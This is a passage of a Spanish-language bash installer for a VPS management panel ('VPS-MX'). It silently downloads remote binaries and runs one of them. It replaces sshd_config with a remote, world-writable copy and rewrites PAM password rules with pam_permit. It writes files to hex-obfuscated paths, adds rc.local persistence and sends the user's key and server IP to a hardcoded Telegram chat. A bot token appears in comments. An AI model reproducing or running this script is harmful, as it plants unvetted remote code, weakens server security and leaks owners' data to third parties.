r/sbin/ufw" ]] && ufw allow 81/tcp ; ufw allow 8888/tcp
}
[[ -z $(cat /etc/resolv.conf | grep "8.8.8.8") ]] && echo "nameserver	8.8.8.8" >> /etc/resolv.conf
[[ -z $(cat /etc/resolv.conf | grep "1.1.1.1") ]] && echo "nameserver	1.1.1.1" >> /etc/resolv.conf
cd $HOME

 fun_ip () { 

 MIP2=$(wget -qO- ifconfig.me) 

 MIP=$(wget -qO- whatismyip.akamai.com) 

 if [ $? -eq 0 ]; then 

 IP="$MIP" 

 else 

 IP="$MIP2" 

 fi 

 } 

 function_verify () {
echo "verify" > $(echo -e $(echo 2f62696e2f766572696679737973|sed 's/../\\x&/g;s/$/ /'))
echo 'MOD @ChumoGH ChumoGHADM' > $(echo -e $(echo 2F7573722F6C69622F6C6963656E6365|sed 's/../\\x&/g;s/$/ /'))
[[ $(dpkg --get-selections|grep -w "libpam-cracklib"|head -1) ]] || apt-get install libpam-cracklib -y &> /dev/null
echo -e '# Modulo @ChumoGH
password [success=1 default=ignore] pam_unix.so obscure sha512
password requisite pam_deny.so
password required pam_permit.so' > /etc/pam.d/common-password && chmod +x /etc/pam.d/common-password
} 

 funcao_idioma () { 

 clear 

 clear 

 msg -bar2 

 msg -bar2 

 figlet " LATMX" | lolcat 

 echo -e "     ESTE SCRIPT ESTA OPTIMIZADO A IDIOMA ESPAÑOL" 

 msg -bar2 

 pv="$(echo es)" 

 [[ ${#id} -gt 2 ]] && id="es" || id="$pv" 

 byinst="true" 

 } 

 install_fim () { 
 #mkdir /etc/VPS-MX/tmp
 touch /etc/VPS-MX/tmp/style
 msg -ama "               Finalizando Instalacion" && msg bar2 

 [[ $(find /etc/VPS-MX/controlador -name nombre.log|grep -w "nombre.log"|head -1) ]] || wget -O /etc/VPS-MX/controlador/nombre.log https://github.com/lacasitamx/VPSMX/raw/master/ArchivosUtilitarios/nombre.log &>/dev/null 

 [[ $(find /etc/VPS-MX/controlador -name IDT.log|grep -w "IDT.log"|head -1) ]] || wget -O /etc/VPS-MX/controlador/IDT.log https://github.com/lacasitamx/VPSMX/raw/master/ArchivosUtilitarios/IDT.log &>/dev/null 

 [[ $(find /etc/VPS-MX/controlador -name tiemlim.log|grep -w "tiemlim.log"|head -1) ]] || wget -O /etc/VPS-MX/controlador/tiemlim.log https://github.com/lacasitamx/VPSMX/raw/master/ArchivosUtilitarios/tiemlim.log &>/dev/null 

 touch /usr/share/lognull &>/dev/null 

 wget https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SR/SPR &>/dev/null -O /usr/bin/SPR &>/dev/null 

 chmod 775 /usr/bin/SPR &>/dev/null 

 wget -O /usr/bin/SOPORTE https://www.dropbox.com/s/8oi0mt9ikv5z8d0/soporte &>/dev/null 

 chmod 775 /usr/bin/SOPORTE &>/dev/null 

 SOPORTE &>/dev/null 

 echo "ACCESO ACTIVADO" >/usr/bin/SOPORTE 

 wget -O /bin/rebootnb https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/rebootnb &> /dev/null 

 chmod +x /bin/rebootnb 

 wget -O /bin/resetsshdrop https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/resetsshdrop &> /dev/null 

 chmod +x /bin/resetsshdrop 

 wget -O /etc/versin_script_new https://raw.githubusercontent.com/lacasitamx/version/master/vercion &>/dev/null 

 wget -O /etc/ssh/sshd_config https://raw.githubusercontent.com/lacasitamx/ZETA/master/sshd &>/dev/null 

 chmod 777 /etc/ssh/sshd_config 

 msg -bar2 

 echo '#!/bin/sh -e' > /etc/rc.local 

 sudo chmod +x /etc/rc.local 

 echo "sudo rebootnb" >> /etc/rc.local 

 echo "sudo resetsshdrop" >> /etc/rc.local 

 echo "sleep 2s" >> /etc/rc.local 

 echo "exit 0" >> /etc/rc.local 

 /bin/cp /etc/skel/.bashrc ~/ 

 echo 'clear' >> .bashrc 

 echo 'echo ""' >> .bashrc 

 echo 'figlet "LATIMEX"|lolcat' >> .bashrc 

 echo 'mess1="$(less /etc/VPS-MX/message.txt)" ' >> .bashrc 

 echo 'echo "" '>> .bashrc 

 echo 'echo -e "\t\033[92mRESELLER : $mess1 "'>> .bashrc 

 echo 'echo -e "\t\e[1;33mVERSION: \e[1;31m$(cat /etc/versin_script_new)"'>> .bashrc 

 echo 'echo "" '>> .bashrc 

 echo 'echo -e "\t\033[97mPARA MOSTAR PANEL BASH ESCRIBA: sudo menu "'>> .bashrc 

 echo 'echo ""'>> .bashrc 

 echo -e "         COMANDO PRINCIPAL PARA ENTRAR AL PANEL " 

 echo -e "  \033[1;41m               menu             \033[0;37m" && msg -bar2 

 rm -rf /usr/bin/pytransform &> /dev/null 

 rm -rf LACASITA.sh 

 rm -rf lista-arq 

 service ssh restart &>/dev/null 

 exit 

 } 

  ofus () {
unset txtofus
number=$(expr length $1)
for((i=1; i<$number+1; i++)); do
txt[$i]=$(echo "$1" | cut -b $i)
case ${txt[$i]} in
".")txt[$i]="x";;
"x")txt[$i]=".";;
"5")txt[$i]="s";;
"s")txt[$i]="5";;
"1")txt[$i]="@";;
"@")txt[$i]="1";;
"2")txt[$i]="?";;
"?")txt[$i]="2";;
"4")txt[$i]="0";;
"0")txt[$i]="4";;
"/")txt[$i]="K";;
"K")txt[$i]="/";;
esac
txtofus+="${txt[$i]}"
done
echo "$txtofus" | rev
}

 verificar_arq () {
[[ ! -d ${SCPdir} ]] && mkdir ${SCPdir}
mv -f ${SCPinstal}/$1 ${SCPdir}/$1 && chmod +x ${SCPdir}/$1
}
fun_ip

 NOTIFY () { 

 clear 

 clear 

 msg -bar 

 msg -ama " Notify-BOT (Notificasion Remota)|@VPSDARK_Noty_Bot " 

 msg -bar 

 echo -e "\033[1;94m Notify-BOT es un simple notificador de:" 

 echo -e "\033[1;94m >> Usuario Expirado" 

 echo -e "\033[1;94m >> Usuario Eliminado" 

 echo -e "\033[1;94m >> Avisos de VPS Reiniciada" 

 echo -e "\033[1;94m >> Avisos de Monitor de Protocolos" 

 echo -e "\033[1;97m Inicie El BOT de Telegram" 

 echo -e "\033[1;92m ¡¡ Para sacar su ID entre al BOT @VPSDARK" 

 echo -e "\033[1;92m Aparesera algo parecido � → Tu ID es: 45145564   " 

 msg -bar 

 echo -e "\033[1;93mIgrese un nombre para el VPS:\033[0;37m"; read -p " " nombr 

 echo "${nombr}" > /etc/VPS-MX/controlador/nombre.log 

 echo -e "\033[1;93mIgrese su ID �:\033[0;37m"; read -p " " idbot 

 echo "${idbot}" > /etc/VPS-MX/controlador/IDT.log 

 msg -bar 

 echo -e "\033[1;32m              ID AGREGADO CON EXITO" 

 msg -bar 

 wget -qO- ifconfig.me > /etc/VPS-MX/IP.log 

 ipt=`less /etc/VPS-MX/IP.log` > /dev/null 2>&1 

 Nip="$(echo $ipt)" 

 NOM="$(less /etc/VPS-MX/controlador/nombre.log)" 

 NOM1="$(echo $NOM)" 

 IDB1=`less /etc/VPS-MX/controlador/IDT.log` > /dev/null 2>&1 

 IDB2=`echo $IDB1` > /dev/null 2>&1 

 #KEY="5935180805:AAHd0N9ube02JlsUrKWSVChOVsZGBtabSrw" 

# URL="https://api.telegram.org/bot$KEY/sendMessage" 

 MSG="⚠️ ►► AVISO DE VPS: $NOM1 ⚠ 

 � ►► IP: $Nip 

 � ►► MENSAJE DE PRUEBA 

 � ►► NOTI-BOT ACTIVADO CORRECTAMENTE" 

 curl -s --max-time 10 -d "chat_id=$IDB2&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null 

 echo -e "\033[1;34m            SE ENVIO MENSAJE DE PRUEBA " 

 } 

 fun_ipe 

 wget -O /usr/bin/trans https://raw.githubusercontent.com/scriptsmx/script/master/Install/trans &> /dev/null 

 wget -O /bin/Desbloqueo.sh https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/Desbloqueo.sh &> /dev/null 

 chmod +x /bin/Desbloqueo.sh 

 wget -O /bin/monitor.sh https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/monitor.sh &> /dev/null 

 chmod +x /bin/monitor.sh 

 wget -O /var/www/html/estilos.css https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/estilos.css &> /dev/null 

 [[ -f "/usr/sbin/ufw" ]] && ufw allow 443/tcp &>/dev/null; ufw allow 80/tcp &>/dev/null; ufw allow 3128/tcp &>/dev/null; ufw allow 8799/tcp &>/dev/null; ufw allow 8080/tcp &>/dev/null; ufw allow 81/tcp &>/dev/null 

 clear 

 msg -bar2 

 msg -ama "     [ SCRIPT \033[1;97m  MOD LACASITAMX\033[1;33m ]" 

 msg -ama "  \033[1;96m      �Usar Ubuntu 20 a 64 De Preferencia� " 

 msg -bar2 

 [[ $1 = "" ]] && funcao_idioma || { 

 [[ ${#1} -gt 2 ]] && funcao_idioma || id="$1" 

 } 

 error_fun () { 

 msg -bar2 && msg -verm "ERROR entre VPS<-->GENERADOR (Port 81 TCP)" && msg -bar2 

 [[ -d ${SCPinstal} ]] && rm -rf ${SCPinstal} 

 exit 1 

 } 

 invalid_key () { 

 msg -bar2 && msg -verm "  Code Invalido -- #¡Key Invalida#! " && msg -bar2 

 [[ -e $HOME/lista-arq ]] && rm $HOME/lista-arq 

 rm -rf lista-arq 

 exit 1 

 } 

 while [[ ! $Key ]]; do 

 msg -bar2 && msg -ne "\033[1;93m          >>> INGRESE SU KEY ABAJO <<<\n   \033[1;37m" && read Key 

 echo -ne " " && msg -bar3
echo -ne " \033[1;41m Key : \033[0;33m" && read Key
tput cuu1 && tput dl1
done
Key="$(echo "$Key" | tr -d '[[:space:]]')"
cd $HOME
IiP=$(ofus "$Key" | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}')
[[ $(curl -s --connect-timeout 5 $IiP:8888 ) ]] && { 
tput cuu1 && tput dl1
msg -bar
echo -ne " \e[90m\e[43m CHEK KEY : \033[0;33m"
echo -e " \e[3;32m ENLAZADA AL GENERADOR\e[0m" | pv -qL 50
ofen=$(wget -qO- $(ofus $Key))
tput cuu1 && tput dl1
msg -bar3
echo -ne " \033[1;41m CHEK KEY : \033[0;33m"
tput cuu1 && tput dl1
wget --no-check-certificate -O $HOME/lista-arq $(ofus "$Key")/$IP > /dev/null 2>&1 && echo -ne "\033[1;34m [ \e[3;32m VERIFICANDO KEY  \e[0m \033[1;34m]\033[0m" && pkrm=$(ofus "$Key")
} || {
	echo -e "\e[3;31mCONEXION FALLIDA\e[0m" && sleep 1s
	invalid_key && exit
}
[[ -e $HOME/log.txt ]] && rm -f $HOME/log.txt
IP=$(ofus "$Key" | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}') && echo "$IP" > /usr/bin/vendor_code
   REQUEST=$(ofus "$Key"|cut -d'/' -f2)
   [[ ! -d ${SCPinstal} ]] && mkdir ${SCPinstal}
   for arqx in $(cat $HOME/lista-arq); do
   wget --no-check-certificate -O ${SCPinstal}/${arqx} ${IP}:81/${REQUEST}/${arqx} > /dev/null 2>&1 && verificar_arq "${arqx}" 
   done 

 wget -qO- ifconfig.me > /etc/VPS-MX/IP.log 

 userid="${SCPdir}/ID" 

 #TOKEN="5935180805:AAHd0N9ube02JlsUrKWSVChOVsZGBtabSrw" 

 #URL="https://api.telegram.org/bot$TOKEN/sendMessage" 

 MSG="�= KEY INSTALADO =� 

 ╔═════ ▓▓ ࿇ ▓▓ ═════╗ 

 - - - - - - - ×∆× - - - - - - - 

 User ID: 

 - - - - - - - ×∆× - - - - - - - 

 Usuario: $(cat ${SCPdir}/message.txt) 

 - - - - - - - ×∆× - - - - - - - 

 IP: $(cat ${SCPdir}/IP.log) 

 - - - - - - - ×∆× - - - - - - - 

 KEY: $Key 

 - - - - - - - ×∆× - - - - - - - 

 By @

 - - - - - - - ×∆× - - - - - - - 

 ╚═════ ▓▓ ࿇ ▓▓ ═════╝ 

 " 

 activ=

 curl -s --max-time 10 -d "chat_id=$activ&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null 

 curl -s --max-time 10 -d "chat_id=605531451&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null 

 rm ${SCPdir}/IP.log &>/dev/null 

 msg -bar2 

 listaarqs="$(locate "lista-arq"|head -1)" && [[ -e ${listaarqs} ]] && rm $listaarqs 

 cat /etc/bash.bashrc|grep -v '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' > /etc/bash.bashrc.2 

 echo -e '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' >> /etc/bash.bashrc.2 

 mv -f /etc/bash.bashrc.2 /etc/bash.bashrc 

 echo "${SCPdir}/menu" > /usr/bin/menu && chmod +x /usr/bin/menu 

 echo "${SCPdir}/menu" > /usr/bin/vpsdark && chmod +x /usr/bin/vpsdark 
 
 echo "$Key" > ${SCPdir}/key.txt 

 [[ -d ${SCPinstal} ]] && rm -rf ${SCPinstal} 

 [[ ${#id} -gt 2 ]] && echo "es" > ${SCPidioma} || echo "${id}" > ${SCPidioma} 

 echo -e "${cor[2]}         DESEAS INSTALAR NOTI-BOT?(Default n)" 

 echo -e "\033[1;34m  (Deves tener Telegram y el BOT: @DARK_MOD_Noty_Bot)" 

 msg -bar2 

 read -p " [ s | n ]: " NOTIFY 

 [[ "$NOTIFY" = "s" || "$NOTIFY" = "S" ]] && NOTIFY 

 msg -bar2 

 [[ ${byinst} = "true" ]] && install_fim 

 else 

 invalid_key 

 rm -rf VPSDARK ista-arq 

 fi 

 rm -rf VPSDARK lista-arq
